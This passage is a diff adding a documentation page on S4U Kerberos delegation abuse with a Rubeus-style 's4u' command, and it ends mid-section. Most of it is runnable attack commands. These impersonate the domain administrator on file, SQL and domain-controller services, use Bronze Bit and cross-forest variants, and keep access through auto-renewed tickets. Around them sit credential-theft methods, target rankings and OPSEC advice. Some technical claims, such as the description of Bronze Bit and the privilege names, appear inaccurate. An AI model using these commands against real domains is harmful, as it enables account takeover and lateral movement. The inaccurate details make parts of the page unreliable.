@@ -1,0 +1,1554 @@
+---
+title: 's4u'
+description: 'Perform S4U constrained delegation abuse for privilege escalation and lateral movement'
+icon: 'arrows-alt'
+sidebarTitle: 's4u'
+---
+
+<Warning>
+  S4U delegation abuse enables impersonation of any domain user, including administrators, providing critical privilege escalation and lateral movement capabilities.
+</Warning>
+
+<CardGroup cols={2}>
+  <Card title="User Impersonation" icon="user-secret">
+    Impersonate any domain user without their credentials
+  </Card>
+  <Card title="Service Access" icon="server">
+    Gain access to backend services via delegation
+  </Card>
+  <Card title="Privilege Escalation" icon="arrow-up">
+    Escalate from service account to domain admin
+  </Card>
+  <Card title="Cross-Domain" icon="network-wired">
+    Exploit delegation across domain boundaries
+  </Card>
+</CardGroup>
+
+## Overview
+
+Perform S4U (Service for User) constrained delegation abuse to impersonate users and gain access to services. This technique exploits Kerberos constrained delegation configurations to escalate privileges and move laterally through Active Directory environments.
+
+<Tabs>
+  <Tab title="Basic Syntax">
+    ```bash
+    # Core S4U delegation attack
+    Rubeus.exe s4u [authentication] /impersonateuser:USER /msdsspn:SERVICE [options]
+
+    # Common attack pattern
+    Rubeus.exe s4u /user:svcaccount /rc4:hash /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
+    ```
+  </Tab>
+
+  <Tab title="Authentication Methods">
+    ```bash
+    # Using existing TGT
+    /ticket:BASE64_TGT
+    /ticket:FILE.KIRBI
+
+    # Hash authentication
+    /user:SERVICE_ACCOUNT /rc4:NTLM_HASH
+    /user:SERVICE_ACCOUNT /aes256:AES_HASH /domain:DOMAIN
+
+    # Certificate authentication
+    /user:SERVICE_ACCOUNT /certificate:CERT.PFX /password:CERT_PASS
+    ```
+  </Tab>
+
+  <Tab title="Target Configuration">
+    ```bash
+    # Local domain targeting
+    /impersonateuser:target_user /msdsspn:service/server.domain.com
+
+    # Cross-domain targeting
+    /impersonateuser:admin /msdsspn:cifs/server.remote.com /targetdomain:remote.com /targetdc:dc.remote.com
+
+    # Alternative service exploitation
+    /msdsspn:http/web.domain.com /altservice:cifs,host,ldap
+    ```
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Core Parameters">
+    <Expandable title="Authentication & Impersonation" icon="key" defaultOpen>
+      <ParamField path="user" type="string">
+        <Expandable title="Service Account Details">
+          Service account name configured for delegation
+
+          **Requirements:**
+          - Account must have delegation rights
+          - Must be configured for constrained delegation
+          - Requires corresponding hash or TGT
+
+          **Discovery Commands:**
+          ```powershell
+          # Find delegation-enabled accounts
+          Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}
+          ```
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="impersonateuser" type="string" required>
+        <Expandable title="Target User Selection">
+          User to impersonate via delegation
+
+          **High-Value Targets:**
+          - `administrator` - Built-in admin account
+          - `domain admin` - Domain administrative users
+          - `service accounts` - High-privilege service accounts
+          - `computer accounts` - Machine account impersonation
+
+          **Notes:**
+          - Can impersonate ANY domain user
+          - No password/hash required for target
+          - Includes protected users (with some limitations)
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="msdsspn" type="string" required>
+        <Expandable title="Delegation Target Service">
+          Service Principal Name for delegation target
+
+          **Format:** `service/hostname.domain.com[:port]`
+
+          **Common Patterns:**
+          - `cifs/fileserver.corp.local` - File services
+          - `http/web.corp.local` - Web applications
+          - `MSSQLSvc/sql.corp.local:1433` - Database
+          - `ldap/dc.corp.local` - Directory services
+          - `host/server.corp.local` - Administrative access
+
+          **Discovery:** Check service account's delegation configuration
+        </Expandable>
+      </ParamField>
+    </Expandable>
+  </Tab>
+
+  <Tab title="Authentication Options">
+    <Expandable title="Hash-Based Authentication" icon="fingerprint">
+      <ParamField path="rc4" type="string">
+        <Expandable title="NTLM Hash Authentication">
+          NTLM hash for service account authentication
+
+          **Format:** 32-character hexadecimal string
+          **Example:** `32ed87bdb5fdc5e9cba88547376818d4`
+
+          **Acquisition Methods:**
+          - DCSync attacks
+          - LSA dumping
+          - Hash cracking
+          - Pass-the-hash captures
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="aes256" type="string">
+        <Expandable title="AES256 Hash Authentication">
+          AES256 Kerberos key for service account
+
+          **Advantages:**
+          - More secure than RC4
+          - Better OPSEC profile
+          - Modern encryption standard
+
+          **Acquisition:** DCSync or advanced hash extraction
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="ticket" type="string">
+        <Expandable title="TGT-Based Authentication">
+          Existing TGT for service account
+
+          **Formats:**
+          - Base64-encoded ticket data
+          - .kirbi file path
+
+          **Sources:**
+          - Extracted via `dump` command
+          - Golden ticket attacks
+          - Legitimate authentication
+        </Expandable>
+      </ParamField>
+    </Expandable>
+  </Tab>
+
+  <Tab title="Advanced Options">
+    <Expandable title="Service Manipulation" icon="cogs">
+      <ParamField path="altservice" type="string">
+        <Expandable title="Alternative Service Targeting">
+          Alternative service to target using delegation
+
+          **Service Equivalence Classes:**
+          - `cifs,host` - File and administrative access
+          - `http,https` - Web service access
+          - `ldap,gc` - Directory service access
+          - `rpcss,dcom` - RPC services
+
+          **Multi-Service Targeting:**
+          ```bash
+          /altservice:cifs,host,http,ldap
+          ```
+
+          **Use Cases:**
+          - Expand delegation scope
+          - Access related services
+          - Maximize attack surface
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="bronzebit" type="boolean">
+        <Tooltip tip="Bypass PAC validation in S4U2Proxy">
+          Enable Bronze Bit attack technique
+        </Tooltip>
+      </ParamField>
+
+      <ParamField path="nopac" type="boolean">
+        <Tooltip tip="Skip PAC validation entirely">
+          Disable PAC validation (often used with bronzebit)
+        </Tooltip>
+      </ParamField>
+
+      <ParamField path="self" type="boolean">
+        <Tooltip tip="Perform only S4U2Self phase">
+          Execute S4U2Self only (get forwardable TGS)
+        </Tooltip>
+      </ParamField>
+    </Expandable>
+
+    <Expandable title="Cross-Domain Configuration" icon="network-wired">
+      <ParamField path="targetdomain" type="string">
+        <Expandable title="Cross-Domain Targeting">
+          Target domain for cross-domain delegation
+
+          **Requirements:**
+          - Domain trust relationship
+          - Cross-domain delegation configuration
+          - Network connectivity to target domain
+
+          **Trust Types:**
+          - Parent-child trusts
+          - Forest trusts
+          - External trusts (limited)
+        </Expandable>
+      </ParamField>
+
+      <ParamField path="targetdc" type="string">
+        <Expandable title="Target Domain Controller">
+          Specific domain controller in target domain
+
+          **Selection Criteria:**
+          - Network accessibility
+          - Service availability
+          - Load balancing considerations
+          - OPSEC considerations
+        </Expandable>
+      </ParamField>
+    </Expandable>
+
+    <Expandable title="Output & Injection" icon="upload">
+      <ParamField path="ptt" type="boolean">
+        <Tooltip tip="Inject resulting ticket into current session">
+          Pass-the-ticket injection (recommended)
+        </Tooltip>
+      </ParamField>
+
+      <ParamField path="outfile" type="string">
+        <Tooltip tip="Save ticket to .kirbi file">
+          File path for ticket storage
+        </Tooltip>
+      </ParamField>
+
+      <ParamField path="createnetonly" type="string">
+        <Tooltip tip="Create new process with injected ticket">
+          Create network-only process with ticket
+        </Tooltip>
+      </ParamField>
+    </Expandable>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Basic Delegation">
+    <CodeGroup>
+    ```bash Hash Authentication
+    # Service account to file server
+    Rubeus.exe s4u /user:svc_web /rc4:32ed87bdb5fdc5e9cba88547376818d4 /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
+
+    # Service account to database
+    Rubeus.exe s4u /user:svc_app /aes256:b982a9a15bc34fd3ccfb18041095b5394a7c6a0a9f2e02c3d6b8d86a59a73f02 /impersonateuser:administrator /msdsspn:MSSQLSvc/sql01.corp.local:1433 /ptt
+
+    # Service account to domain controller
+    Rubeus.exe s4u /user:svc_backup /rc4:hash /impersonateuser:administrator /msdsspn:ldap/dc01.corp.local /ptt
+    ```
+
+    ```bash TGT-Based Authentication
+    # Using extracted TGT
+    Rubeus.exe s4u /ticket:doIFujCCBbagAwIBBaEDAgEWooIE... /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
+
+    # Using saved .kirbi file
+    Rubeus.exe s4u /ticket:svc_web.kirbi /impersonateuser:administrator /msdsspn:http/web01.corp.local /ptt
+
+    # Chaining with asktgt
+    Rubeus.exe asktgt /user:svc_sql /rc4:hash /outfile:svc.kirbi
+    Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:MSSQLSvc/sql.corp.local:1433 /ptt
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Service Escalation">
+    <CodeGroup>
+    ```bash Alternative Service Attacks
+    # HTTP delegation to file access
+    Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:http/web01.corp.local /altservice:cifs /ptt
+
+    # Database delegation to administrative access
+    Rubeus.exe s4u /user:svc_sql /aes256:key /impersonateuser:administrator /msdsspn:MSSQLSvc/sql.corp.local:1433 /altservice:host /ptt
+
+    # Multi-service targeting
+    Rubeus.exe s4u /user:svc_app /rc4:hash /impersonateuser:administrator /msdsspn:host/server.corp.local /altservice:cifs,http,ldap,rpcss /ptt
+    ```
+
+    ```bash Privilege Escalation Chains
+    # Web service to domain controller
+    Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:http/web.corp.local /altservice:ldap /ptt
+
+    # Database service to file server
+    Rubeus.exe s4u /user:svc_db /aes256:key /impersonateuser:administrator /msdsspn:MSSQLSvc/db.corp.local:1433 /altservice:cifs /ptt
+
+    # Application service to administrative services
+    Rubeus.exe s4u /user:svc_app /rc4:hash /impersonateuser:administrator /msdsspn:host/app.corp.local /altservice:cifs,host,http /ptt
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Cross-Domain Attacks">
+    <CodeGroup>
+    ```bash Parent-Child Domain Trust
+    # Child to parent domain
+    Rubeus.exe s4u /user:svc_web /rc4:hash /domain:child.corp.local /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /targetdomain:corp.local /targetdc:dc01.corp.local /ptt
+
+    # Parent to child domain
+    Rubeus.exe s4u /user:svc_app /aes256:key /domain:corp.local /impersonateuser:administrator /msdsspn:http/web.child.corp.local /targetdomain:child.corp.local /ptt
+    ```
+
+    ```bash Forest Trust Exploitation
+    # Cross-forest delegation
+    Rubeus.exe s4u /user:svc_exchange /rc4:hash /domain:internal.corp.local /impersonateuser:administrator /msdsspn:cifs/shares.external.local /targetdomain:external.local /targetdc:dc.external.local
+
+    # Service account in trusted forest
+    Rubeus.exe s4u /user:svc_sql /aes256:key /domain:subsidiary.corp /impersonateuser:administrator /msdsspn:MSSQLSvc/db.parent.corp:1433 /targetdomain:parent.corp /ptt
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Advanced Techniques">
+    <CodeGroup>
+    ```bash Bronze Bit Attacks
+    # Standard Bronze Bit
+    Rubeus.exe s4u /user:svc_web /rc4:hash /impersonateuser:administrator /msdsspn:http/web.corp.local /bronzebit /nopac /ptt
+
+    # Bronze Bit with service alternation
+    Rubeus.exe s4u /user:svc_app /aes256:key /impersonateuser:administrator /msdsspn:host/server.corp.local /altservice:cifs /bronzebit /nopac /ptt
+
+    # Cross-domain Bronze Bit
+    Rubeus.exe s4u /user:svc_db /rc4:hash /domain:child.corp.local /impersonateuser:administrator /msdsspn:MSSQLSvc/db.parent.corp:1433 /targetdomain:parent.corp /bronzebit /nopac
+    ```
+
+    ```bash Specialized Operations
+    # S4U2Self only (forwardable TGS)
+    Rubeus.exe s4u /user:svc_app /rc4:hash /impersonateuser:user01 /self /outfile:forwardable.kirbi
+
+    # Create new process context
+    Rubeus.exe s4u /user:svc_sql /aes256:key /impersonateuser:administrator /msdsspn:MSSQLSvc/sql.corp.local:1433 /createnetonly:"C:\Windows\System32\cmd.exe"
+
+    # OPSEC-conscious delegation
+    Rubeus.exe s4u /user:svc_web /aes256:key /impersonateuser:normaluser /msdsspn:http/web.corp.local /opsec /ptt
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Integration Workflows">
+    <CodeGroup>
+    ```bash Discovery to Exploitation
+    # 1. Find delegation-enabled accounts
+    # PowerShell: Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}
+
+    # 2. Extract service account credentials
+    Rubeus.exe asktgt /user:svc_found /rc4:discovered_hash /outfile:svc.kirbi
+
+    # 3. Perform delegation attack
+    Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:administrator /msdsspn:discovered_spn /ptt
+
+    # 4. Verify access
+    Rubeus.exe klist
+    ```
+
+    ```bash Persistence via Delegation
+    # Create renewable tickets
+    Rubeus.exe s4u /user:svc_persist /rc4:hash /impersonateuser:administrator /msdsspn:cifs/critical.corp.local /ptt /outfile:persistent.kirbi
+
+    # Renew before expiration
+    Rubeus.exe renew /ticket:persistent.kirbi /autorenew
+
+    # Re-inject as needed
+    Rubeus.exe ptt /ticket:persistent.kirbi
+    ```
+    </CodeGroup>
+  </Tab>
+</Tabs>
+
+<Steps>
+  <Step title="S4U Protocol Flow">
+    <Tabs>
+      <Tab title="S4U2Self Phase">
+        <Frame>
+          <CardGroup cols={2}>
+            <Card title="Request" icon="arrow-right" color="#3b82f6">
+              **Service → KDC**
+              - Service requests TGS for itself
+              - On behalf of target user
+              - Results in forwardable ticket
+              - Uses service account credentials
+            </Card>
+            <Card title="Response" icon="arrow-left" color="#22c55e">
+              **KDC → Service**
+              - Returns forwardable TGS
+              - Ticket marked for delegation
+              - Contains user's identity
+              - Ready for S4U2Proxy
+            </Card>
+          </CardGroup>
+        </Frame>
+
+        **Technical Details:**
+        - Service authenticates with its own credentials
+        - Requests ticket "for" another user
+        - No user credentials required
+        - Results in forwardable service ticket
+      </Tab>
+
+      <Tab title="S4U2Proxy Phase">
+        <Frame>
+          <CardGroup cols={2}>
+            <Card title="Delegation Request" icon="share" color="#8b5cf6">
+              **Service → KDC**
+              - Uses forwardable TGS from S4U2Self
+              - Requests access to backend service
+              - Must be in delegation configuration
+              - Impersonates target user
+            </Card>
+            <Card title="Service Ticket" icon="ticket" color="#f59e0b">
+              **KDC → Service**
+              - Returns service ticket for backend
+              - Ticket for target user identity
+              - Access to configured service only
+              - Ready for service authentication
+            </Card>
+          </CardGroup>
+        </Frame>
+
+        **Security Controls:**
+        - Delegation list restricts targets
+        - PAC validation (can be bypassed)
+        - Service account must be configured
+        - Time-limited ticket validity
+      </Tab>
+
+      <Tab title="Service Access">
+        <Info>
+          Final phase where the delegated service ticket is used for actual service access
+        </Info>
+
+        **Access Patterns:**
+        - Present service ticket to backend service
+        - Authenticate as impersonated user
+        - Gain user's privileges on target service
+        - Service sees "legitimate" user access
+
+        **Attack Value:**
+        - No user credentials needed
+        - Full user privilege inheritance
+        - Transparent to target service
+        - Potential for privilege escalation
+      </Tab>
+    </Tabs>
+  </Step>
+
+  <Step title="Delegation Types">
+    <Tabs>
+      <Tab title="Unconstrained Delegation">
+        <Warning>
+          Unconstrained delegation provides the highest attack surface and risk
+        </Warning>
+
+        **Characteristics:**
+        - Service can delegate to ANY service
+        - Stores user's TGT for reuse
+        - No restrictions on delegation targets
+        - Legacy configuration pattern
+
+        **Attack Implications:**
+        - Complete user impersonation capability
+        - Access to any domain service
+        - TGT extraction opportunities
+        - High privilege escalation potential
+
+        **Detection:** `userAccountControl` contains `TRUSTED_FOR_DELEGATION` (524288)
+      </Tab>
+
+      <Tab title="Constrained Delegation">
+        <CardGroup cols={2}>
+          <Card title="Traditional KCD" icon="lock">
+            **Configuration:**
+            - Service account property
+            - `msDS-AllowedToDelegateTo` attribute
+            - Explicit SPN list
+            - "Trust this computer for delegation" setting
+
+            **Limitations:**
+            - Only to configured services
+            - Requires service account privileges
+            - Administrator-controlled configuration
+          </Card>
+          <Card title="Protocol Transition" icon="arrows-spin">
+            **Capabilities:**
+            - Accept non-Kerberos authentication
+            - Transition to Kerberos delegation
+            - S4U2Self without prior authentication
+            - Enhanced impersonation scenarios
+
+            **Attack Surface:**
+            - Broader impersonation capabilities
+            - Protocol downgrade opportunities
+            - Bypass authentication requirements
+          </Card>
+        </CardGroup>
+      </Tab>
+
+      <Tab title="Resource-Based (RBCD)">
+        <Info>
+          Resource-Based Constrained Delegation reverses the control model
+        </Info>
+
+        **Key Differences:**
+        - Backend service controls delegation
+        - `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
+        - Computer account creation abuse
+        - More flexible configuration
+
+        **Attack Vectors:**
+        - Create computer accounts
+        - Modify resource delegation settings
+        - Exploit weak ACL permissions
+        - Self-delegation scenarios
+
+        **Discovery Commands:**
+        ```powershell
+        # Find RBCD configurations
+        Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+        ```
+      </Tab>
+    </Tabs>
+  </Step>
+
+  <Step title="Configuration Requirements">
+    <Expandable title="Service Account Prerequisites" defaultOpen>
+      **Required Privileges:**
+      - `SeAssignPrimaryTokenPrivilege` (Act as part of operating system)
+      - `SeTcbPrivilege` (Act as part of operating system)
+      - Service account must be configured for delegation
+
+      **Delegation Configuration:**
+      - Trust for delegation enabled
+      - Specific services configured in delegation list
+      - Proper SPN registration
+      - Domain functional level support
+    </Expandable>
+
+    **Security Boundaries:**
+    - Protected Users group (limited)
+    - Account cannot be delegated flag
+    - Cross-forest restrictions
+    - Time-based limitations
+  </Step>
+</Steps>
+
+<Tabs>
+  <Tab title="Prerequisites">
+    <Steps>
+      <Step title="Service Account Compromise">
+        <CardGroup cols={2}>
+          <Card title="Credential Requirements" icon="key">
+            **Required Access:**
+            - Service account password hash (RC4/AES)
+            - Valid TGT for service account
+            - Certificate-based authentication
+            - Kerberos ticket extraction
+          </Card>
+          <Card title="Configuration Validation" icon="check-circle">
+            **Verification Steps:**
+            - Account has delegation configuration
+            - Target services in delegation list
+            - Proper privilege assignments
+            - Domain controller accessibility
+          </Card>
+        </CardGroup>
+
+        **Credential Acquisition Methods:**
+        - Kerberoasting service account
+        - DCSync for password hashes
+        - Memory extraction (dump, lsass)
+        - Golden ticket with service account
+      </Step>
+
+      <Step title="Delegation Discovery">
+        **Account Enumeration:**
+        ```powershell
+        # Find all delegation-enabled accounts
+        Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties servicePrincipalName,msDS-AllowedToDelegateTo
+
+        # Include computer accounts
+        Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties servicePrincipalName,msDS-AllowedToDelegateTo
+
+        # Find unconstrained delegation
+        Get-ADUser -Filter {TrustedForDelegation -eq $true}
+        ```
+
+        **Service Validation:**
+        - Verify SPN registration
+        - Check delegation target list
+        - Validate service accessibility
+        - Test network connectivity
+      </Step>
+
+      <Step title="Target Assessment">
+        **High-Value Targets:**
+        - Domain controllers (LDAP, GC)
+        - File servers (CIFS)
+        - Database servers (MSSQLSvc)
+        - Web applications (HTTP/HTTPS)
+        - Administrative services (HOST)
+
+        **Privilege Analysis:**
+        - Administrative service access
+        - Cross-domain delegation
+        - Service account privileges
+        - Delegation scope assessment
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Discovery Commands">
+    <CodeGroup>
+    ```powershell PowerShell Enumeration
+    # Comprehensive delegation discovery
+    Get-ADUser -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,msDS-AllowedToDelegateTo | Format-Table Name,TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
+
+    # Find computer accounts with delegation
+    Get-ADComputer -Filter {TrustedForDelegation -eq $true -or TrustedToAuthForDelegation -eq $true} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,msDS-AllowedToDelegateTo
+
+    # Resource-based constrained delegation
+    Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where {$_.msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null}
+    ```
+
+    ```bash LDAP Queries
+    # ADFind enumeration
+    adfind.exe -f "(&(objectCategory=user)(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(msDS-AllowedToDelegateTo=*)))" cn servicePrincipalName msDS-AllowedToDelegateTo userAccountControl
+
+    # BloodHound data collection
+    # SharpHound will identify delegation relationships
+
+    # Manual LDAP verification
+    ldapsearch -x -H ldap://dc.corp.local -D "user@corp.local" -W -b "dc=corp,dc=local" "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))" cn msDS-AllowedToDelegateTo
+    ```
+
+    ```bash Network Analysis
+    # SPN scanning for delegation targets
+    setspn -T corp.local -Q */*
+
+    # Validate service accessibility
+    nmap -p 88,389,445,1433,3389 target.corp.local
+
+    # Test delegation targets
+    telnet target.corp.local 445
+    telnet sql.corp.local 1433
+    ```
+    </CodeGroup>
+  </Tab>
+
+  <Tab title="Assessment Matrix">
+    <Expandable title="Delegation Risk Assessment" defaultOpen>
+      | Account Type | Delegation Type | Risk Level | Attack Complexity | Impact |
+      |--------------|-----------------|------------|-------------------|--------|
+      | Service Account | Unconstrained | Critical | Low | Domain Admin |
+      | Service Account | Constrained | High | Medium | Service Access |
+      | Computer Account | RBCD | High | Medium | Local Admin |
+      | User Account | Protocol Transition | Medium | High | User Privileges |
+    </Expandable>
+
+    **Target Prioritization:**
+    1. **Critical Services:** Domain controllers, Exchange, SQL
+    2. **Administrative Services:** File servers, management tools
+    3. **Application Services:** Web apps, databases
+    4. **Infrastructure Services:** DNS, DHCP, monitoring
+
+    **Attack Feasibility:**
+    - Service account credential difficulty
+    - Network accessibility to targets
+    - Delegation configuration scope
+    - Defensive tool presence
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Service Categories">
+    <CardGroup cols={2}>
+      <Card title="Infrastructure Services" icon="server">
+        **Domain Controllers:**
+        - `ldap/dc.corp.local` - Directory services
+        - `gc/dc.corp.local` - Global catalog
+        - `dns/dc.corp.local` - DNS services
+        - `host/dc.corp.local` - Administrative access
+
+        **Critical Impact:** Domain admin equivalent access
+      </Card>
+      <Card title="File Services" icon="folder">
+        **File Servers:**
+        - `cifs/fileserver.corp.local` - SMB shares
+        - `nfs/fileserver.corp.local` - NFS shares
+        - `host/fileserver.corp.local` - Admin access
+
+        **Access Scope:** File system, administrative shells
+      </Card>
+      <Card title="Database Services" icon="database">
+        **SQL Servers:**
+        - `MSSQLSvc/sql.corp.local:1433` - SQL Server
+        - `oracle/db.corp.local:1521` - Oracle
+        - `mysql/db.corp.local:3306` - MySQL
+
+        **Privilege Escalation:** Database admin, OS access
+      </Card>
+      <Card title="Web Services" icon="globe">
+        **Application Servers:**
+        - `http/web.corp.local` - Web applications
+        - `https/web.corp.local` - Secure web
+        - `ws/web.corp.local` - Web services
+
+        **Attack Surface:** Application admin, IIS access
+      </Card>
+    </CardGroup>
+  </Tab>
+
+  <Tab title="Service Equivalence">
+    <Steps>
+      <Step title="Service Class Relationships">
+        <Expandable title="Administrative Service Classes" defaultOpen>
+          **HOST Service Class:**
+          - Accepts multiple service types
+          - Provides administrative access
+          - Works for many Windows services
+          - Often configured for delegation
+
+          **Equivalent Services:**
+          - `host/server` = Administrative access
+          - `cifs/server` = File system access
+          - `rpcss/server` = RPC service access
+          - `wsman/server` = PowerShell remoting
+        </Expandable>
+
+        **Attack Strategy:**
+        ```bash
+        # Delegation to host service
+        /msdsspn:host/server.corp.local
+
+        # Automatic access to equivalent services:
+        # - CIFS file access
+        # - RPC administrative access
+        # - PowerShell remoting
+        # - Service management
+        ```
+      </Step>
+
+      <Step title="Cross-Service Exploitation">
+        <CardGroup cols={2}>
+          <Card title="Web to File" icon="arrow-right">
+            **Scenario:** HTTP delegation to file access
+            ```bash
+            /msdsspn:http/web.corp.local /altservice:cifs
+            ```
+
+            **Result:** Web app access → File system access
+          </Card>
+          <Card title="Database to Admin" icon="arrow-up">
+            **Scenario:** SQL delegation to administrative access
+            ```bash
+            /msdsspn:MSSQLSvc/sql.corp.local:1433 /altservice:host
+            ```
+
+            **Result:** Database access → Full administrative control
+          </Card>
+        </CardGroup>
+      </Step>
+
+      <Step title="Multi-Service Targeting">
+        **Maximize Attack Surface:**
+        ```bash
+        # Target multiple related services
+        /msdsspn:http/server.corp.local /altservice:cifs,host,ldap,rpcss
+
+        # Database to everything
+        /msdsspn:MSSQLSvc/sql.corp.local:1433 /altservice:host,cifs,http,rpcss
+
+        # Administrative delegation expansion
+        /msdsspn:host/server.corp.local /altservice:cifs,http,ldap,dns,rpcss
+        ```
+
+        **Service Priority:**
+        1. `host` - Maximum administrative access
+        2. `cifs` - File system access
+        3. `ldap` - Directory service access
+        4. `rpcss` - RPC service management
+        5. `http` - Web application access
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Target Selection">
+    <Steps>
+      <Step title="High-Value Targets">
+        **Domain Controllers:**
+        - `ldap/dc01.corp.local` - Primary DC
+        - `ldap/dc02.corp.local` - Secondary DC
+        - `gc/dc01.corp.local` - Global catalog
+
+        **Attack Value:** Domain admin equivalent access
+
+        **File Servers:**
+        - `cifs/shares.corp.local` - Primary file server
+        - `cifs/backup.corp.local` - Backup server
+        - `cifs/archive.corp.local` - Archive server
+
+        **Attack Value:** Data access, credential harvesting
+      </Step>
+
+      <Step title="Infrastructure Servers">
+        **Management Servers:**
+        - `host/sccm.corp.local` - SCCM server
+        - `host/wsus.corp.local` - Update server
+        - `host/monitoring.corp.local` - Monitoring
+
+        **Database Servers:**
+        - `MSSQLSvc/sql01.corp.local:1433` - Production SQL
+        - `MSSQLSvc/reporting.corp.local:1433` - Reporting
+        - `oracle/erp.corp.local:1521` - ERP system
+
+        **Web Applications:**
+        - `http/intranet.corp.local` - Corporate intranet
+        - `http/portal.corp.local` - Employee portal
+        - `https/vpn.corp.local` - VPN gateway
+      </Step>
+
+      <Step title="Targeting Strategy">
+        **Reconnaissance:**
+        1. Enumerate delegation configurations
+        2. Map service relationships
+        3. Identify high-privilege targets
+        4. Assess network accessibility
+
+        **Prioritization:**
+        1. Domain controllers (critical)
+        2. Administrative servers (high)
+        3. Database servers (high)
+        4. File servers (medium)
+        5. Application servers (medium)
+
+        **Exploitation Sequence:**
+        1. Start with configured delegation targets
+        2. Use /altservice for expansion
+        3. Chain through multiple services
+        4. Document successful paths
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+<Tabs>
+  <Tab title="Bronze Bit Attack">
+    <Warning>
+      Bronze Bit attacks exploit PAC validation weaknesses to bypass delegation restrictions
+    </Warning>
+
+    <Steps>
+      <Step title="Technique Overview">
+        **Core Concept:**
+        - Exploits missing PAC validation in S4U2Proxy
+        - Allows delegation without proper configuration
+        - Bypasses msDS-AllowedToDelegateTo restrictions
+        - Works against services not in delegation list
+
+        **Technical Mechanism:**
+        - Service requests S4U2Self ticket
+        - Modifies or removes PAC validation
+        - Uses ticket for S4U2Proxy to any service
+        - Target service accepts without validation
+      </Step>
+
+      <Step title="Implementation Requirements">
+        <CardGroup cols={2}>
+          <Card title="Prerequisites" icon="check-circle">
+            **Required Access:**
+            - Compromised service account
+            - Service account hash or TGT
+            - Network access to target
+            - Target service existence
+          </Card>
+          <Card title="Limitations" icon="exclamation-triangle">
+            **Environmental Factors:**
+            - Some services validate PAC
+            - Modern Windows may block
+            - Patch level dependent
+            - Domain functional level
+          </Card>
+        </CardGroup>
+
+        **Attack Execution:**
+        ```bash
+        # Standard Bronze Bit
+        Rubeus.exe s4u /user:svc_account /rc4:hash /impersonateuser:administrator /msdsspn:cifs/target.corp.local /bronzebit /nopac /ptt
+
+        # With service alternation
+        Rubeus.exe s4u /user:svc_web /aes256:key /impersonateuser:administrator /msdsspn:http/web.corp.local /altservice:cifs,host /bronzebit /nopac /ptt
+        ```
+      </Step>
+
+      <Step title="Target Expansion">
+        **Unrestricted Targeting:**
+        - Attack services not in delegation list
+        - Bypass delegation configuration entirely
+        - Access any reachable service
+        - Combine with service substitution
+
+        **Strategic Applications:**
+        ```bash
+        # Target domain controllers (not in delegation list)
+        /msdsspn:ldap/dc01.corp.local /bronzebit /nopac
+
+        # Access administrative services
+        /msdsspn:host/critical.corp.local /bronzebit /nopac
+
+        # Multi-service bronze bit
+        /msdsspn:http/any.corp.local /altservice:cifs,host,ldap /bronzebit /nopac
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Cross-Domain Exploitation">
+    <Steps>
+      <Step title="Trust Relationship Analysis">
+        <CardGroup cols={3}>
+          <Card title="Parent-Child Trusts" icon="sitemap">
+            **Characteristics:**
+            - Bidirectional trusts
+            - Automatic trust creation
+            - Cross-domain delegation support
+            - Forest-wide implications
+          </Card>
+          <Card title="External Trusts" icon="link">
+            **Limitations:**
+            - Unidirectional options
+            - Limited delegation scope
+            - Authentication boundaries
+            - Selective authentication
+          </Card>
+          <Card title="Forest Trusts" icon="tree">
+            **Capabilities:**
+            - Cross-forest delegation
+            - Transitive relationships
+            - Global catalog access
+            - Enterprise-wide scope
+          </Card>
+        </CardGroup>
+
+        **Trust Discovery:**
+        ```powershell
+        # Enumerate domain trusts
+        Get-ADTrust -Filter *
+        nltest /domain_trusts
+
+        # Forest trust information
+        Get-ADForest | Select-Object Domains,ForestMode,GlobalCatalogs
+        ```
+      </Step>
+
+      <Step title="Cross-Domain Attack Execution">
+        **Parent-Child Scenarios:**
+        ```bash
+        # Child to parent delegation
+        Rubeus.exe s4u /user:svc_child /rc4:hash /domain:child.corp.local /impersonateuser:administrator /msdsspn:cifs/parent-server.corp.local /targetdomain:corp.local /targetdc:dc01.corp.local /ptt
+
+        # Parent to child delegation
+        Rubeus.exe s4u /user:svc_parent /aes256:key /domain:corp.local /impersonateuser:administrator /msdsspn:ldap/child-dc.child.corp.local /targetdomain:child.corp.local /ptt
+        ```
+
